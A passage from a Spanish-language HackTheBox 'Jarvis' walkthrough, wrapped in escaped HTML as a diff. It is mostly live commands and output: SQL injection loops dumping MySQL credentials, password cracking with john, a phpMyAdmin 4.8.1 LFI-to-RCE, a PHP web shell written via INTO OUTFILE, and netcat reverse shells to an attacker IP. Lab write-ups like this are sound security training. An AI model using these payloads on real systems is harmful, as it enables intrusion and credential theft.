class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 100: slow_log
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 101: table_stats
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 102: tables_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 103: time_zone
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 104: time_zone_leap_second
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 105: time_zone_name
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 106: time_zone_transition
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 107: time_zone_transition_type
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 108: user
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 109: accounts
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 110: cond_instances
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 111: events_stages_current
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 112: events_stages_history
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Tabla 113: events_stages_history_long
+^C#                                                                                                                              
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya vemos una tabla interesante &lt;strong&gt;user&lt;/strong&gt;; asi que vamos a tratar de obtener las columnas con la inyección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_name='user' limit 0,1-- -&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 100&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Columna &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,column_name,4,5,6,7%20from%20information_schema.columns%20where%20table_name%20=%20'user'limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 0: Host
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 1: User
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 2: Password
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 3: Select_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 4: Insert_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 5: Update_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 6: Delete_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 7: Create_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 8: Drop_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 9: Reload_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 10: Shutdown_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 11: Process_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 12: File_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 13: Grant_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 14: References_priv
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Columna 15: Index_priv
+^C#  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos dos columnas que ya nos llaman la atención, &lt;strong&gt;User&lt;/strong&gt; y &lt;strong&gt;Password&lt;/strong&gt;; así que ahora vamos a tratar de obtener la información de la tabla &lt;strong&gt;user&lt;/strong&gt; y en específico, dichas columnas. Eso lo lograremos con la inyección &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10.10.10.143/room.php?cod=0 union select 1,2,group_contact(User,0x3a,Password),4,5,6,7 from mysql.user&lt;/code&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: Determinamos que la tabla &lt;strong&gt;user&lt;/strong&gt; se encuentra en la base de datos &lt;strong&gt;mysql&lt;/strong&gt; debido a que el sitio web no presenta una página relacionada al login, por lo tanto la base de datos &lt;strong&gt;hotel&lt;/strong&gt; no podría contener alguna tabla en donde se presenten usuarios y contraseñas):&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 10&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[*] Data &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.143/room.php?cod=0%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user%20limit%20&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;,1--%20-&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;price-room&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&amp;lt;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 1&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 0: DBadmin:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 1: 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 2: 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Data 3: 
+^C#        
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos unas credenciales que podrían ser del panel de administración de phpmyadmin y debemos recordar que la contraseña se encuentra hasheada, por lo tanto vamos a utilizar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt; para crackearla, así que nos creamos un archivo en donde pongamos el hash (DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0) y procedemos a utilizar la herramienta:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt &lt;span class=&quot;nb&quot;&gt;hash
+&lt;/span&gt;Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mysql-sha1, MySQL 4.1+ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA1 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Warning: no OpenMP support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt;, consider &lt;span class=&quot;nt&quot;&gt;--fork&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+imissyou         &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DBadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:00 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-12-26 21:50&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 20.00g/s 19520p/s 19520c/s 19520C/s shadow1..ashlee
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como siempre, guardamos las credenciales que tengamos y procedemos a utilizarlas en el panel de login.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya nos encontramos en el dentro del panel de administración de phpmyadmin. Si checamos la versión, vemos que estamos frente a la 4.8.0, por lo que podríamos buscar algún exploit público que nos ayude.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit phpmyadmin 4.8
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+phpMyAdmin 4.8 - Cross-Site Request Forgery                                                    | php/webapps/46982.txt
+phpMyAdmin 4.8.0 &amp;lt; 4.8.0-1 - Cross-Site Request Forgery                                        | php/webapps/44496.html
+phpMyAdmin 4.8.1 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local File Inclusion &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | php/webapps/44924.txt
+phpMyAdmin 4.8.1 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Local File Inclusion &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                    | php/webapps/44928.txt
+phpMyAdmin 4.8.4 - &lt;span class=&quot;s1&quot;&gt;'AllowArbitraryServer'&lt;/span&gt; Arbitrary File Read                                  | php/webapps/46041.py
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos 2 los cuales parte de un LFI para obtener RCE y de una manera mejor explicada, podemos consultar el recurso &lt;a href=&quot;https://www.vulnspy.com/phpmyadmin-4.8.1/&quot;&gt;Vulnspy&lt;/a&gt; en donde nos indica que primero debemos contar con credenciales de acceso (ya las tenemos), después realizar la consulta SQL en donde vamos a insertar código php (en el ejemplo se pone &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select '&amp;lt;?php phpinfo();exit;?&amp;gt;'&lt;/code&gt;) en donde pondremos nuestro código malicioso; posteriormente consultamos una sesión generada a partir de la consulta utilizando el valor de la cookie &lt;strong&gt;phpMyAdmin&lt;/strong&gt; (en el ejemplo nos indica que la ruta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_[el_valor_de_la_cookie]&lt;/code&gt;). Siguiendo dichos pasos, logramos ser el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;, por lo tanto ahora debemos entablarnos una reverse shell para ganar acceso a la máquina (&lt;strong&gt;Nota&lt;/strong&gt;: Si tratamos de hacer lo indicado con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;phpinfo()&lt;/code&gt;, es necesario salir de la sesión y volver a entrar al panel de login).&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Generamos nuestra reverse shell: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 443 &amp;gt;/tmp/f&quot;);exit;?&amp;gt;&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Nos ponemos en escucha por el puerto 443: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -nlvp 443&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Con el plugin &lt;strong&gt;Edit this cookie&lt;/strong&gt; obtenemos nuestra cookie para el campo &lt;strong&gt;phpMyAdmin&lt;/strong&gt;: glpacrhpqr2ancitvpu72p59j1jkljoc&lt;/li&gt;
+  &lt;li&gt;Ahora accedemos al siguiente recurso: &lt;strong&gt;10.10.10.143/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_glpacrhpqr2ancitvpu72p59j1jkljoc&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-cookie.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; ❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39822
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;www-data&lt;/strong&gt;; sin embargo, no podemos visualizar la flag.&lt;/p&gt;
+
+&lt;p&gt;Otra manera de comprometer el equipo es mediante la inclusión de archivos en conjunto con la inyección de comandos SQL, para este caso utilizaremos la sentencia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,2,3,4,5,6,7-- -&lt;/code&gt; en lugar de poner el número 3 vamos a tratar de poner un texto y posteriormente guardarlo en un archivo bajo una ruta del sistema, que si recordamos, podemos acceder a &lt;strong&gt;images&lt;/strong&gt; y vamos a suponer que se encuentra en la ruta absoluta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/images&lt;/code&gt;. Por lo tanto, nuestra sentencia sería &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select 1,2,&quot;Esto es una prueba&quot;,4,5,6,7 into outfile &quot;/var/www/html/images/test.txt&quot;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que podemos crear archivos y acceder a ellos, por lo que ya debemos estar pensando en tratar de subir de archivo php que nos permita la ejecución de comandos. Nuestra sentencia sería la siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;union &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php echo shell_exec(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;['cmd']); ?&amp;gt;&quot;&lt;/span&gt;,4,5,6,7 into outfile &lt;span class=&quot;s2&quot;&gt;&quot;/var/www/html/images/shell.php&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jarvis/jarvis-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hemos logrado tener ejecución de comandos a nivel de sistema, así que lo único que nos queda es entablarnos una reverse shell a nuestra máquina de atacante y haremos uso de &lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;PentestMonkey&lt;/a&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.143/images/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/sh 10.10.14.27 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.143] 39846
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;www-data
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como siempre y para trabajar más comodos, vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt;. Ahora vamos a enumerar un poco el sistema para ver la forma en la que podamos escalar privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+www-data@jarvis:/var/www/html/images&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on jarvis:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User www-data may run the following commands on jarvis:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pepper : ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /var/www/Admin-Utilities/simpler.py
